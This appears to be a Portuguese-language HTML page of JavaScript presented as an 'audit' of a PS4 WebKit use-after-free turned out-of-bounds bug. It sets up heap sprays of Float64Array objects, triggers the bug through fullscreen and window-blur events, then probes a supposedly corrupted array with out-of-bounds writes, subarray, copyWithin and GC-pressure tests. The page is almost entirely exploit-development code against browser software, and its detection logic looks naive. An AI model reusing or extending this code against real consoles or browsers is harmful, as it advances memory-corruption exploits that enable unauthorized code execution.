<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF → OOB Auditoria</title>
<style>
body { font-family: monospace; background: #000; color: #0f0; }
button { margin: 5px; }
.pass { color: #0f0; }
.fail { color: #f00; }
.warn { color: #ff0; }
</style>
</head>

<body>

<h2>PS4 WebKit – Auditoria Real UAF → OOB</h2>

<button onclick="setup()">1. SETUP UAF</button>
<button onclick="runAudit()">2. RODAR AUDITORIA</button>

<pre id="log"></pre>

<script>
let g_arrays = [];
let g_corrupted = null;
let g_u8 = null;
let triggerCount = 0;
const PATTERN = 2.121995791e-314;
const log = m => document.getElementById("log").textContent += m + "\n";

function setup() {
    log("== SETUP ==");
    g_arrays = [];
    g_corrupted = null;
    triggerCount = 0;

    for (let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        g_arrays.push(a);
    }

    if (document.documentElement.webkitRequestFullscreen)
        document.documentElement.webkitRequestFullscreen();

    window.onblur = () => {
        triggerCount++;
        log("Trigger #" + triggerCount);

        let spray = [];
        for (let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(PATTERN);
            spray.push(s);
        }

        for (let a of g_arrays) {
            if (a[0] === PATTERN) {
                g_corrupted = a;
                g_u8 = new Uint8Array(a.buffer);
                log("UAF CONFIRMADO – view capturada");
                break;
            }
        }

        if (!g_corrupted)
            log("UAF NÃO detectado");
    };
}

function runAudit() {
    log("\n== AUDITORIA ==");
    if (!g_corrupted) {
        log("ERRO: rode o SETUP primeiro");
        return;
    }

    auditLengthInvariant();
    auditIndexWrite();
    auditSubarray();
    auditCopyWithin();
    auditIteration();
    auditGCInfluence();

    log("\n== FIM DA AUDITORIA ==");
}

/* ===================== TESTES ===================== */

function auditLengthInvariant() {
    log("\n[TESTE 1] Length invariável");
    try {
        if (g_corrupted.length !== 8)
            log("FAIL: length alterado -> " + g_corrupted.length);
        else
            log("PASS: length = 8");
    } catch (e) {
        log("EXCEPTION: " + e);
    }
}

function auditIndexWrite() {
    log("\n[TESTE 2] Escrita fora do limite");
    try {
        g_corrupted[9] = 13.37;
        if (g_corrupted[9] === 13.37)
            log("FAIL: escrita fora do length funcionou");
        else
            log("PASS: RangeError ou ignorado");
    } catch (e) {
        log("PASS: exceção lançada");
    }
}

function auditSubarray() {
    log("\n[TESTE 3] subarray()");
    try {
        let s = g_corrupted.subarray(0, 32);
        if (s.length > 8)
            log("FAIL: subarray expandiu para " + s.length);
        else
            log("PASS: subarray limitado");
    } catch (e) {
        log("EXCEPTION: " + e);
    }
}

function auditCopyWithin() {
    log("\n[TESTE 4] copyWithin()");
    try {
        g_corrupted.copyWithin(0, 4, 20);
        log("PASS: copyWithin não quebrou limites");
    } catch (e) {
        log("PASS: exceção segura");
    }
}

function auditIteration() {
    log("\n[TESTE 5] Iteração for..of");
    try {
        let count = 0;
        for (let v of g_corrupted) count++;
        if (count > 8)
            log("FAIL: iterou além do length: " + count);
        else
            log("PASS: iteração normal (" + count + ")");
    } catch (e) {
        log("EXCEPTION: " + e);
    }
}

function auditGCInfluence() {
    log("\n[TESTE 6] Influência de GC / pressão de heap");

    try {
        let junk = [];
        for (let i = 0; i < 20000; i++)
            junk.push(new Float64Array(16));

        let v = g_corrupted[16];
        if (v !== undefined)
            log("FAIL: leitura além do limite após GC");
        else
            log("PASS: GC não afetou limites");

    } catch (e) {
        log("EXCEPTION: " + e);
    }
}
</script>

</body>
</html>
